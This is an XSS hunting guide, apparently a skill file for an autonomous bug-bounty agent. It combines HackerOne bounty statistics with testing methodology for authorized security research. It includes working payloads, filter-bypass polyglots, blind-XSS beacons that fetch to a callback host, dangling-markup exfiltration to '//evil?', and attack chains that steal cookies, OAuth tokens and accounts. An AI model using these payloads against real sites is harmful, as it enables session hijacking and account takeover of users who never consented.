# Upstream source: xss (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/xss/SKILL.md`

---

---
name: xss
description: >-
  Hunting skill for xss vulnerabilities. Built from 174 public bug bounty reports. Use when hunting xss on
  any target. For markup injection that reflects raw HTML but does NOT execute JavaScript (no
  `<script>`/event-handler execution), see html-injection — escalate here once script execution is
  possible. Combined with the HackerOne field guide (real disclosed-report data: where it pays, quick wins,
  payload banks). Hunt reflected, stored, and DOM XSS. Use when testing input reflection, HTML/JS sinks,
  CSP, rich-text editors, markdown renderers, or client-side frameworks. Backed by 2,569 disclosed HackerOne
  reports.
---

# XSS — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# Cross-Site Scripting (XSS) — HackerOne field guide

Built from **2,569** publicly disclosed HackerOne reports (2013–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **2,569** · paid: **546**
- Median bounty **$500** · p90 **$2,500** · max **$16,000** · total **$548,499**
- Median upvotes **11**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 57 | $92,530 | 3692 |
| Shopify | 129 | $83,350 | 5563 |
| Uber | 51 | $61,250 | 1642 |
| Mail.ru | 291 | $51,870 | 4740 |
| HackerOne | 33 | $27,750 | 3084 |
| Internet Bug Bounty | 17 | $17,265 | 498 |
| Reddit | 10 | $15,500 | 1343 |
| Open-Xchange | 34 | $14,400 | 366 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`q` `s` `search` `query` `lang` `next` `return` `url` `redirect` `callback` `name` `title` `bio` `message` `comment` `filename` `theme` `template`

## Tools

`dalfox` · `kxss` · `XSStrike` · `Burp DOM Invader` · `waybackurls | gf xss | httpx` · `interactsh`

## Escalation chains

- Cookie/token theft -> account takeover.
- XSS in admin context -> CSRF bypass -> privileged action.
- XSS + service worker -> persistent compromise.

## Related

- `csrf` (541 reports)
- `open-redirect` (385 reports)
- `account-takeover` (262 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

## Autonomous Testing Priority

**Verify reflection before claiming XSS — encoding is everything.**

Your payload must appear in the response body with angle brackets UNESCAPED. `<script>` is XSS. `&lt;script&gt;` is safe encoding — not vulnerable.

**Use a UNIQUE NUMERIC CANARY in your proof payload** — e.g. `<script>alert(91234)</script>` or `"><img src=x onerror=alert(91234)>`. Pick a distinctive 4+ digit number, not `alert(1)`. Practice pages are full of *example* payloads like `alert(1)`/`alert('XSS')` in their hint text; a unique number is how you tell YOUR reflected payload apart from the page's decoy examples. Proof = your `alert(<canary>)` shows up in the response with raw, unescaped angle brackets.

**Try these contexts in order:**

1. **Inline script injection** (works when HTML context allows new tags):
   ```
   <script>alert(CANARY)</script>
   ```
   Use whatever canary string your proof contract specifies. Confirmed when `<script>alert(CANARY)` appears literally (not HTML-encoded) in the response.

2. **Attribute event injection** (when `<` is filtered but attributes are injectable):
   ```
   " onmouseover="alert(CANARY)
   " onerror="alert(CANARY)
   " onload="alert(CANARY)
   ```

3. **URL/href context:**
   ```
   javascript:alert(CANARY)
   ```

**Distinguishing success from failure:**
- **Vulnerable:** response contains `<script>alert(` unescaped — browser would execute it
- **Filtered/safe:** response contains `&lt;script&gt;` or `&#x3C;script&#x3E;` — properly encoded
- **Blocked:** response is an error, or the reflected value is absent entirely

**For stored XSS:** inject into a field that other pages display (comments, usernames, ticket titles). Then fetch the rendering page and check for unescaped payload. The payload executes when any user views that page — higher severity than reflected.

---

## Crown Jewel Targets

XSS is high-value when it combines **privileged context + persistent delivery + scope escalation**. The highest payouts come from:

- **Admin panels and authenticated dashboards** (e.g., `*/admin`, `*/settings`) — attacker can hijack sessions with elevated privileges, exfiltrate tokens, or pivot to account takeover
- **Payment/financial flows** (`paypal.com`, checkout pages, currency converters) — XSS here enables credential harvesting and financial fraud at scale
- **Stored XSS in collaborative features** (wikis, markdown renderers, issue trackers, RDoc, labels, tags) — one payload infects every viewer, multiplying impact
- **SSO/signin pages** (e.g., `paypal.com/signin`) — XSS here is critical because it can steal auth tokens across the entire platform
- **Shared SaaS tenant surfaces** (`*.myshopify.com`, `api.collabs.*`) — XSS in one tenant's context can bleed across tenant boundaries
- **Help/documentation sites** (`help.shopify.com`) — lower severity individually, but often have looser sanitization and trusted user perception
- **SVG/file upload endpoints** — frequently bypasses CSP and sanitization simultaneously

**Asset types that pay most:** Main product domains > Admin subdomains > API endpoints > Marketing/help sites

---

## OOB-Or-It-Didn't-Happen Gate (Blind / Stored XSS)

For blind and stored XSS — claims require an out-of-band confirmation, the same as blind SSRF. The OOB receiver fires when the payload actually executes in a browser somewhere (an admin reviewing logs, a SOC analyst opening a ticket, an email rendering a stored payload).

### What is NOT confirmation

- ASP.NET request validator rejected your `<` and returned a different status code → not XSS, that's WAF noise.
- Your payload appears in the response body URL-encoded or HTML-encoded → not XSS, that's correct output encoding.
- The form action attribute contains your payload string as `%22onclick%3D…` → not XSS, the browser does NOT decode URL encoding inside HTML attribute values; the `%22` stays as literal `%22` in the DOM.
- Your `<script>` tag appears in the response as `&lt;script&gt;` → not XSS, that's escaping.

### What IS confirmation

- A request to your unique Collaborator subdomain (e.g., `bxss-err-<random>.<collab>.oastify.com`) arrives in the OOB listener after your payload was stored / reflected / queued.
- For stored XSS: the request arrives **hours or days later** when an admin views the affected resource. Plant payloads early in the engagement and keep the listener open.
- The User-Agent of the firing request is a browser (Mozilla/Chrome), not the server's own backend HTTP client.

### Where to plant blind-XSS beacons

Any field whose value might be viewed in an admin UI / log viewer / email / report later:
- Error messages (`?ErrorMessage=<svg onload=fetch('//bxss-<tag>.<collab>/x')>`)
- Auth-flow source params (`?Source=`, `?ReturnUrl=`)
- Login form username field (admin may view audit logs of failed logins)
- User-Agent header (some SOC consoles render UA as HTML)
- Referer header (some analytics dashboards render Referer as HTML)
- Email addresses on registration / contact forms
- File-upload filenames

**Always sub-tag the Collaborator subdomain by sink** so callbacks identify which field fired.

**Lesson from a authorized engagement:** 10 blind-XSS Collaborator beacons planted across `ErrorMessage`, `Source`, the Authentication.asmx username field, User-Agent header, Referer header, and request paths. Zero callbacks over a 10-minute polling window. Conclusion: the SharePoint SOC views logs / errors in tooling that does not render HTML, AND the ASP.NET request validator blocks `<` in query strings before the payload reaches storage. Stored-XSS claim correctly retracted.

---

## Attack Surface Signals

**URL Patterns:**
```
/admin*
/settings*
/wiki*
/reports*
?utm_source=
?redirect=
?q=
?search=
?callback=
?return_url=
/render*
/preview*
/documentation*
```

**Response Headers (weak defense signals):**
```
Content-Type: text/html (without nosniff)
Content-Security-Policy: (absent or using unsafe-inline)
Content-Type: image/svg+xml (CSP often not applied)
X-XSS-Protection: 0
```

**JS Patterns in source that signal DOM XSS:**
```javascript
document.write(
innerHTML =
location.hash
location.search
location.href
document.referrer
eval(
setTimeout(string,
setInterval(string,
$.html(
$(location
```

**Tech Stack Signals:**
- Rails applications using `html_safe`, `raw`, `translate`, Action Text, or ActionView sanitize helpers
- GitLab/GitHub markdown pipelines (Banzai, Kramdown, RDoc, Kroki)
- Applications allowing SVG uploads or rendering
- Sites using `style` tag in allowlists
- Kroki/Mermaid/PlantUML diagram rendering endpoints
- Cache layers in front of authenticated pages (cache poisoning vector)

---

## Step-by-Step Hunting Methodology

1. **Map all reflection points** — Spider the target and identify every place user input appears in HTML output. Prioritize: URL parameters, form fields, HTTP headers (User-Agent, Referer), file upload names/contents, and API response fields rendered in UI.

2. **Classify by type** — Determine if each reflection is Reflected (URL param → response), Stored (database → later rendering), or DOM-based (JS reads URL/storage → DOM sink). Each requires different payload delivery.

3. **Probe sanitizer behavior** — Send harmless canary strings first: `aaa"bbb'ccc<ddd` to determine which characters are escaped. Observe if output is in HTML context, attribute context, JS context, or URL context.

   **Marker Discipline:** When choosing canary strings, they MUST be unique random alphanumeric strings (8+ chars, no English words, no protocol keywords). Bad markers: `test`, `marker`, `evil`, `attacker`, `payload`, `javascript`, `script`. Good markers: `cpmark987abc`, `x4hd2k9pq`, `__ZZ_MARKER_<random>_ZZ__`. Before claiming reflection, search the baseline (no-marker) response for the marker — if it appears naturally in the page (e.g., the word `javascript` is in every page's help-link hrefs), it's a false-positive trap and you need a different marker. This single check catches 80% of false-positive reflection reports.

4. **Test allowlisted tag combinations** — If a sanitizer is in use, probe for dangerous tag combos: `<math>+<style>`, `<svg>+<style>`, `<iframe srcdoc>`, `<style>` with expressions.

5. **Hunt SVG and file upload vectors** — Upload SVG files containing `<script>` tags. Check Content-Type response header. Test if CSP applies to SVG responses separately.

6. **Test markdown/documentation renderers** — In wiki, README, or doc fields, try: `[text](javascript:alert(1))`, inline HTML injection, Kroki/Mermaid payloads, RDoc `link:javascript:` syntax.

7. **Check redirect parameters** — Test `?redirect=javascript:alert(1)` and `?return_url=//evil.com` — look for single-click XSS via improper redirect sanitization.

8. **Probe UTM and analytics parameters** — `utm_source`, `utm_medium`, `utm_campaign` are often reflected without sanitization on marketing pages.

9. **Test CSP bypass opportunities** — If CSP is present, look for: JSONP endpoints on allowed domains, `unsafe-inline` in style-src, SVG that bypasses script-src, script gadgets on whitelisted CDNs.

10. **Attempt stored XSS in profile/metadata fields** — Username, bio, tag names, label colors, organization names — these render in many contexts and often have weaker validation.

11. **Check cache poisoning** — Test if reflected XSS payloads can be cached and served to other users (especially on CDN-fronted pages), transforming reflected XSS into stored-equivalent.

12. **Validate in target browser** — Always confirm in a real browser before reporting. Many payloads echo back in Burp but fail to execute in a real browser due to CSP, output encoding, framework auto-escaping, context mismatch, WAF normalization, or browser HTML-parsing differences. (Note: Chrome's XSS Auditor was removed in Chrome 78 / Oct 2019 and no shipping browser has one — never attribute a failed PoC to an "XSS auditor".)

---

## Common Root Causes

1. **Trusting `html_safe` in Rails** — Developers mark strings as safe after partial sanitization, or chain `.html_safe` on user-supplied data without full sanitization.

2. **Allowlist sanitizers with dangerous tag combinations** — Allowing `style` alongside `math` or `svg` creates mXSS (mutation XSS) opportunities even when individual tags seem harmless.

3. **Third-party rendering pipelines** — Markdown-to-HTML pipelines (Banzai, Kramdown, Kroki) introduce XSS when diagram/rendering engines aren't sandboxed and output isn't re-sanitized.

4. **Reflecting URL parameters without encoding** — UTM params, redirect URLs, and search terms are reflected in page HTML or JS without proper HTML-encoding, especially on marketing/help pages that are treated as lower-security.

5. **SVG treated as non-script content** — Developers apply CSP to HTML responses but forget that `image/svg+xml` responses can execute JavaScript and often aren't covered by the same CSP header.

6. **Incomplete sanitizer patches** — CVE-patched sanitizers are bypassed by slight variations (e.g., CVE-2022-32209's incomplete fix demonstrates that sanitizer logic is difficult to get right, creating bypass chains).

7. **`javascript:` scheme not blocked in href/src** — Link renderers (RDoc, Markdown) fail to block `javascript:` URLs in href attributes, treating them as valid external links.

8. **Cache layers storing authenticated user input** — CDN or reverse proxy caches store responses containing user-controlled XSS payloads, serving them to subsequent unauthenticated users.

9. **File upload without Content-Type enforcement** — Accepting SVG or HTML files and serving them without forcing `Content-Disposition: attachment` or overriding Content-Type.

10. **Translation helper XSS** — Rails `translate`/`t()` helper marks translation strings as HTML-safe and interpolates user input, enabling injection through locale keys.

---

## Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   The attacker must demonstrate a concrete action: execute JavaScript in victim's browser session on the target domain, steal session cookies/tokens, perform actions as the victim, or exfiltrate sensitive data. "Alert box appears" is not sufficient — state what the alert box *represents* in terms of access (e.g., "I can read `document.cookie` which contains the auth token used for all admin API calls").

2. **What does the victim LOSE?**
   The victim must lose something real: session control (account takeover), sensitive data (cookies, CSRF tokens, PII), money (financial action performed without consent), or trust (credential phishing via DOM manipulation). If the victim is an unauthenticated user on a public page with no session, quantify what *that* user's browser is exposed to.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must have a self-contained PoC URL or step sequence that any reviewer can follow without prior setup. The payload must fire in a current browser (Chrome/Firefox latest) without special configuration. If it only works in outdated browsers or requires the victim to have a specific extension installed, it likely won't be accepted.

---

## Real Impact Examples

**Scenario 1 — Stored XSS via Cache Poisoning on Sign-In Page**
An attacker discovered that a major payment platform's sign-in page reflected user-controlled input and was cached by the CDN layer. By sending a crafted request that poisoned the cache, the attacker transformed a reflected XSS into a stored-equivalent that fired for every user visiting the login page. Impact: mass credential harvesting at scale — every user who visited the sign-in page would have their credentials captured. The bypassed CSP made remediation require both code fixes and cache purging.

**Scenario 2 — Stored XSS via Diagram Rendering in Wiki**
A developer platform's wiki feature integrated a third-party diagram rendering service (Kroki). An attacker crafted a malicious diagram payload that, when rendered, executed arbitrary JavaScript in the context of any user viewing the wiki page. Because wikis are shared across team members including project owners and admins, the payload could silently exfiltrate OAuth tokens and perform administrative actions on behalf of every viewer — effectively achieving organization-level account takeover from a single stored payload.

**Scenario 3 — Sanitizer Bypass via Label Color Field with CSP Bypass**
A project management platform patched an XSS vulnerability in label color fields but the fix was incomplete. A researcher found that by combining the `style` tag allowlist with specific tag nesting (`svg>style`), the sanitizer's output mutated when parsed by the browser, executing injected JavaScript. The payload also bypassed the platform's Content Security Policy because the injection occurred in an allowlisted inline style context. Impact: any user with label-creation permissions (often all project members) could inject persistent XSS that triggered for every project visitor, enabling cross-user session theft within the same project namespace.

---

## Chains & Compositions (Senior Hunting)

XSS as a standalone finding gets paid at Low-Medium on mature programs. Real payouts cluster around chains that convert JS execution into account takeover, mass-victim impact, CSP bypass, or token exfil. The composition skill is *"what does my XSS unlock once it executes?"* — and the answer is always something beyond `alert(1)`.

### Chain 1 — Reflected XSS + Cache Poisoning → Persistent Stored XSS at CDN Scale (Kettle-class)

- **A.** Identify a reflected XSS where the vulnerable input lands in the response body and the response is cacheable (`Cache-Control: public, max-age=…`).
- **B.** Identify an unkeyed input that influences the cached body — typically `X-Forwarded-Host`, `X-Original-URL`, an unkeyed cookie, or a parameter stripped from the cache key but reflected in the body.
- **C.** Send a single request with the XSS payload via the unkeyed input. Cache stores the poisoned response. Every subsequent CDN-edge visitor receives it for the full TTL.
- **Impact:** Self-inflicted reflected XSS becomes persistent stored XSS affecting every visitor in the affected geo until cache expires. No per-victim interaction required.
- **Real shape:** Glassdoor reflected→stored XSS via cache poisoning, H1 #1424094 (2021-2022); Kettle "Practical Web Cache Poisoning" research. Cross-refs `web-cache` Disclosed Report Citation #4.

### Chain 2 — Self-XSS + CSRF Trigger → Effective Stored XSS → ATO

- **A.** Confirm self-XSS in a profile field (`bio`, `display_name`, `signature`) — payload only executes when the same logged-in user views their own profile.
- **B.** Find a CSRF-vulnerable endpoint that mutates that field (no anti-CSRF token, or `text/plain` enctype bypass).
- **C.** Craft attacker-hosted page that submits the CSRF form setting `bio` to the XSS payload. Victim visits attacker page → CSRF fires → victim's profile updated → victim's next visit to their own profile executes attacker JS.
- **Impact:** Self-XSS that "doesn't pay" becomes ATO. The payload runs in the victim's authenticated session — extract cookie, force email change via XHR, password reset → full ATO.
- **Real shape:** Multiple H1 disclosures 2019-2023 across social platforms. Cross-refs `csrf` step 7 (form-based CSRF on profile mutation).

### Chain 3 — DOM XSS on /signin or /oauth Callback → Fragment Token Capture → ATO

- **A.** Find DOM XSS on a `/signin`, `/oauth/callback`, or `/auth/return` page — typically `document.location.hash` parsed into the DOM without escaping.
- **B.** OAuth-implicit-flow callbacks frequently land tokens in the URL fragment (`#access_token=...`). The fragment is NOT sent to the server; only the browser sees it.
- **C.** XSS payload reads `document.location.hash`, base64-encodes it, exfils via `Image()` to attacker domain. Attacker now holds the OAuth access token.
- **Impact:** Cross-platform ATO. The access token typically grants API scope to Facebook/Google/Microsoft user data; some implementations use the token directly as the session.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor OAuth token leakage (F. Rosén, 2022); Zoom OAuth chained ATO $15,000 (H1 / Harel Security, 2024). Cross-refs `oauth-oidc` Disclosed Report Citation #19 and #20.

### Chain 4 — SVG Upload XSS + CSP Bypass → JS Execution on Trusted Origin → Cookie/Token Theft

- **A.** Identify a file-upload feature that accepts `image/svg+xml`. SVG files are XML and can contain `<script>` tags — many sanitisers process PNG/JPG but pass SVG through unmodified.
- **B.** CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses. The SVG executes JS in the context of whichever origin serves it.
- **C.** If the SVG is served same-origin (common when uploads go to `target.com/uploads/<sha>.svg`), the executing JS has full session-cookie access and can call any same-origin API.
- **Impact:** Stored XSS on the trusted origin without going through any reflected/stored content vector — bypasses CSP entirely; pulls session cookies, calls password-change endpoints, ATO.
- **Real shape:** Multiple disclosed cases across SaaS uploaders; cross-refs `file-upload` SVG section and `xxe` Disclosed Report Citation #3 and #4 (Zivver/Lab45 SVG-upload chains).

### Chain 5 — postMessage XSS + Origin Check Bypass → Cross-Origin Token Exfil → ATO

- **A.** Identify a `window.addEventListener('message', handler)` where `handler` does NOT check `event.origin` (or checks it with a `indexOf`/`endsWith` that fails on `target.com.attacker.com`).
- **B.** Attacker page opens `target.com` in a popup or iframe. Once loaded, sends a `postMessage` payload that the handler evals, processes as XSS, or uses to extract `document.cookie`.
- **C.** Handler executes in `target.com` context; response is `postMessage`'d back to attacker page via `event.source.postMessage(stolenData, '*')`.
- **Impact:** Cross-origin JS execution and exfil with no CSP violation — `postMessage` is a legitimate cross-origin channel; CSP doesn't gate it. Token theft / session hijack.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor postMessage gadgets (2022); Zoom OAuth + postMessage chain (2024). Cross-refs `oauth-oidc` Disclosed Report Citation #19, #20.

### Chain 6 — Markdown/Wiki XSS + Privileged Viewer → Cross-Privilege Stored XSS

- **A.** Stored XSS in a collaborative content field (wiki page, issue comment, customer ticket, support reply) — payload survives Markdown rendering due to insufficient allowlist on `<style>`, `<math>`, `<svg>`, or attribute filters.
- **B.** The collaborative content is viewed by a privileged user (admin, support agent with elevated permissions, project maintainer).
- **C.** Privileged viewer's session executes the payload in their authenticated context — XHR to admin-only endpoints, role-change of attacker, secret exfil from admin-only panels.
- **Impact:** Privilege escalation from low-priv user to admin via stored XSS — attacker promotes themselves on the privileged user's behalf.
- **Real shape:** GitLab/Jira/Confluence markdown-XSS-to-admin-priv-esc class; common payout pattern is High (privilege escalation severity bump over standalone stored XSS).

### Operator-level pattern

When you confirm XSS at A, immediately ask: what state-changing endpoint or token store does this JS now have access to? *Where does the payload run, and who sees it?* The chain payout is 5-20x the standalone XSS payout. Discipline gate before submission: do not file XSS as "Critical" without demonstrating the terminal impact (ATO / token exfil / privilege escalation); file as Medium otherwise.

Cross-references:
- `web-cache` — Chain 1
- `csrf` — Chain 2
- `oauth-oidc` — Chains 3, 5
- `file-upload` / `xxe` — Chain 4
- `account-takeover` — terminal impact for Chains 2, 3, 4, 5

---

## Related Skills & Chains

- **`web-cache`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com → every CDN-edge visitor executes attacker JS without any per-victim interaction.
- **`csrf`** — XSS on origin auto-defeats SameSite=Lax and same-origin checks for state-changing endpoints. Chain primitive: stored XSS in profile bio → fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin → silent email takeover → password reset → full ATO without the victim ever leaving the page.
- **`request-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs. Chain primitive: smuggle a request whose response (carrying attacker HTML) is served as the body of the next legitimate user's GET / → reflected XSS at every visitor without any URL parameter visible in their address bar.
- **`security-arsenal`** — Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads; also the always-rejected list to confirm self-XSS / alert-only PoCs are not submittable.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded (`&lt;`) in the response body — those are the two most common downgrade-to-N/A traps.

---

## Web-Research Methodology Additions (2026)

Online sources consulted: PortSwigger XSS cheat sheet (updated Oct 2026), PortSwigger Web Security Academy DOM-based topics, HackTricks XSS / DOM XSS / DOM-clobbering / XSSI pages, PayloadsAllTheThings XSS Injection, HackerOne "How to Find XSS" guide, Google bughunters mXSS writeup, OWASP DOM-based XSS Prevention Cheat Sheet. These are **additive** to the sections above — keep the earlier material.

### A. Discovery checklist the existing sections don't emphasize

1. **Canary every reflection point, not just parameters.** Inject a unique token into: query/body params, all path segments, every header (`Referer`, `User-Agent`, `X-Forwarded-*`, `X-Original-URL`, `Origin`), cookie names and values, JSON keys (not just values), multipart field names, filename metadata, and WebSocket frames. Then grep the raw response for the canary — note *which context* it lands in.
2. **Classify the context before choosing a payload** — HTML text, quoted/unquoted attribute, `<script>` body, JS string (single/double/template), URL attribute (`href`/`src`/`srcdoc`/`formaction`/`xlink:href`), CSS `url()`, or JSON-inside-script. The same canary needs a different escape per context.
3. **Run DOM Invader early** (Burp browser extension). Enable all sources/sinks, copy its generated canary, put that canary into every input, and let it highlight which sink receives it. Then hand-craft the final payload — the auto-generated one is often blocked. (HackerOne guide.)
4. **Test the "boring" surfaces:** 404/error pages, login/logout, password reset, search, file names, support tickets, calendar invites, email subjects, admin notes, webhook URLs, user-agent/customer-service consoles, and PDF/document generators.
5. **Check the response's charset/encoding.** If no `Content-Type` charset is set, browsers guess. ISO-2022-JP escape sequences can turn benign characters into `<script>`; UTF-7-style JSON tricks have historically escaped JSON context. (HackTricks, referenced research.)
6. **Diff dynamic JS files** (`DetectDynamicJS`) for XSSI: cross-origin `<script>` inclusion can leak authenticated data embedded in executable JS. Also test non-script files (CSV, JSON) loaded as script sources. (HackTricks XSSI.)

### B. Vector families worth adding to your arsenal

- **Dangling markup / scriptless XSS** — when `<`/`>` are filtered but you can still inject HTML, leave an unterminated tag to swallow markup up to a victim token: `<img src='//evil?`, `<audio><source src="//evil?`, `<button form=x><form id=x action="//evil?`, `<textarea name=x>` to consume following markup and exfiltrate it. PortSwigger's cheat sheet lists link `href`/icon, `video`/`track`/`source`, `audio`, `input`/`button` `formaction`, `embed`, and `base href` variants.
- **Server-side XSS via PDF generators** — HTML injected into a headless-browser PDF pipeline is interpreted by the renderer; this fires server-side and can hit privileged origins. (HackTricks "Server Side XSS (Dynamic PDF)", "PDF Injection".)
- **Chrome cache → XSS** — abuse cache key/normalization mismatches so a poisoned response is served under a trusted URL. (HackTricks.)
- **Service Worker abuse / Shadow DOM** — a registered SW can intercept same-origin requests; Shadow DOM sinks are missed by naive scanners. (HackTricks.)
- **Wasm linear-memory template overwrite** — overwriting a format string like `%.*s` with an image/URL turns sanitized input into a JS handler value and yields immediate DOM XSS. (HackTricks.)
- **Unicode injection** — normalization can collapse to executable characters; check the Unicode-injection XSS section on HackTricks.
- **mXSS (mutation XSS)** — sanitizers parse → serialize → reparse; a tree that is "safe" in memory can mutate into executable markup. Classic `<noscript>` vector from Google Search (Masato Kinugawa). Google's May 2025 spec change escapes `<`/`>` in attribute serialization and blocks the create-new-tag class of mXSS, but **vectors relying on tags whose text content is serialized literally** (e.g. `<style>textContent = "</style><img src=x onerror=...>"`) still work. Test sanitizer round-trips directly.
- **Self-XSS → real XSS escalation:** if a cookie-reflected XSS is "self-only", find a vulnerable sibling subdomain and use it to set a cookie for the parent domain, or abuse an admin session-mirroring/support feature that renders your session to an admin. (HackTricks.)
- **CSS gadget to boost impact:** if the injection only fires on `onmouseover`, make the target huge/invisible-but-clickable: `display:block;width:100%` / `position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0`.

### C. DOM source → sink map (HackTricks / PortSwigger)

Sources: `location`, `.hash`, `.href`, `.search`, `.pathname`, `.host`, `.hostname`, `.protocol`, `document.referrer`, `document.title`, `window.name`, `postMessage` / `event.data`, `localStorage`/`sessionStorage`, `XMLHttpRequest`/`fetch` response, `WebSocket` messages.

Sinks:
- Execution: `eval()`, `Function()`, `setTimeout()`, `setInterval()`, `setImmediate()`, `execCommand()`, `execScript()`, `msSetImmediate()`, `range.createContextualFragment()`, `crypto.generateCRMFRequest()`.
- HTML/DOM: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write()`, `document.writeln()`, `someDOMElement.onevent`, `iframe.srcdoc`.
- URL: `script.src`, `iframe.src`, `a.href`, `form.action`, `location.assign()`, `location.replace()`, `open()`, `XMLHttpRequest.open()/send()/setRequestHeader()`, `$.ajax()`, `$.globalEval()`.
- jQuery (all are XSS sinks): `add()`, `after()`, `append()`, `animate()`, `insertAfter()`, `insertBefore()`, `before()`, `prepend()`, `replaceAll()`, `replaceWith()`, `wrap()`, `wrapInner()`, `wrapAll()`, `has()`, `constructor()`, `init()`, `index()`, `jQuery.parseHTML()`, `$.parseHTML()`.
- Client-side JSON injection: `JSON.parse()`, `jQuery.parseJSON()`; client-side SQL: `executeSql()`; XPath: `document.evaluate()`; cookie: `document.cookie`; history: `pushState()`/`replaceState()`.

**Rule:** don't stop at named properties or direct `location` sources. An HTML-only injection that looks harmless can become DOM XSS by supplying the element that trusted JS consumes (DOM clobbering below).

### D. DOM clobbering as a remote script loader (PortSwigger research)

1. App does `window.someConfig || {}` and treats it as trusted.
2. Inject `<a id=someConfig>` (or `form`/`img` with duplicate `id`/`name`) to clobber the global.
3. Code checks truthiness, not type; `script.src = config.scriptUrl` coerces the anchor element to a string, and anchors stringify to their `href`.
4. Result: attacker-controlled script URL. Works if no restrictive `script-src` CSP.
5. Runtime-decode variant: `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">` — the HTML-encoded `&quot;` is decoded at runtime and escapes the attribute.
6. DOM clobbering can bypass CSP (PortSwigger "Bypassing CSP via DOM clobbering"). Also check `document`-level clobbering of `cookie`, `body`, `documentElement`, `forms`, `images`, `scripts`.

### E. WAF / filter bypass additions (PortSwigger 2026 cheat sheet)

- **Restricted characters:** `<script>{onerror=alert}throw 1</script>`, `<script>var{a:onerror}={a:alert};throw 1</script>`, destructuring defaults `var{haha:onerror=alert}=0;throw 1`, `window.name`-concealed payloads, `onpagereveal=setTimeout` + `Event.prototype.toString/name` tricks, `onscroll=setTimeout` with a tall body.
- **Global-object concatenation:** `';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//` and the `self` / `this` / `top` / `parent` variants; `atob.constructor()`, `Set.constructor()`, `createElement('script')+append`.
- **Obfuscation:** `<script src=data:text/javascript;base64,...>` (also with HTML entities and double-URL-encoded Base64), `iframe srcdoc` HTML-encoded, `javascript:` iframe URL with layered HTML/URL encoding, SVG `<script>` with `\u0061\u006c\u0065\u0072\u0074` escapes.
- **Polyglots (PortSwigger):**
  - `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
  - `javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html "\` newline `onmouseover=/*&lt;svg/*/onload=alert()//>`
  - `javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
- **Oversized / newline tricks:** attribute `javascript:` URL via `&#9;`, `&#x0009;`, `&#00000000000009;` (tab entity) with/without semicolon, prefix vs inline placement.
- **AngularJS sandbox escapes** (legacy 1.4.0–1.4.5) still appear in old admin panels — see PortSwigger client-side template injection section.

### F. Blind XSS operational notes (PayloadsAllTheThings / HackerOne)

- Use a **persistent callback service** — XSS Hunter, Burp Collaborator, or your own data-grabber + one-line HTTP server. Confirm receipt before deploying heavy tooling.
- Inject into fields viewed by **other users**: registration name, support ticket, webhook URL, admin note, file name, calendar invite, email subject, user-agent captured in an admin analytics panel.
- A callback payload that exfiltrates `document.cookie`, `DOM`, and current URL is far more valuable than an `alert()` — it proves impact for the report.
- Track which payload fired which context and at what time; blind XSS often triggers hours/days later in a different origin.

### G. Validation bar (don't downgrade your own finding)

- Proof = your **unique canary** executes or appears with raw, unescaped syntax in the response — not `alert(1)` copied from a cheat sheet.
- For mXSS/DOM clobbering, demonstrate actual execution in a browser, not just a mutated DOM tree in DevTools.
- If you only get reflected HTML without JS execution, report as HTML injection / content spoofing, not XSS (HackTricks distinguishes these).
- For blind XSS, require an OOB callback with identifiable marker; no callback = not confirmed.

### Sources

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://portswigger.net/web-security/dom-based/dom-clobbering
- https://portswigger.net/research/bypassing-csp-via-dom-clobbering
- https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html
- https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-xss.html
- https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-clobbering.html
- https://hacktricks.wiki/en/pentesting-web/xssi-cross-site-script-inclusion.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- https://www.hackerone.com/blog/how-find-xss-techniques-security-researchers-use-real-environments
- https://bughunters.google.com/blog/escaping-and-in-attributes-how-it-helps-protect-against-mutation-xss
